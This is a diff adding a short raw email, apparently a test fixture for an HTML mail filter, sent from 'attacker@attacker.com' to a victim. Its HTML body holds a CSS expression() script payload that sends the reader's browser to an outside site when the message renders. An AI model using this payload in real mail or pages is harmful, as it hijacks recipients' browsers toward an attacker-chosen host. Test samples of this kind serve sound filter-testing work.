@@ -1,0 +1,7 @@
+From: <attacker@attacker.com>
+Subject: something
+To: victim@wo.com
+MIME-Version: 1.0
+Content-type: text/html
+
+<DIV STYLE="width: expression((window.r==1)?'':(window.r=1,window.location.href='http://tools88.com/'));">
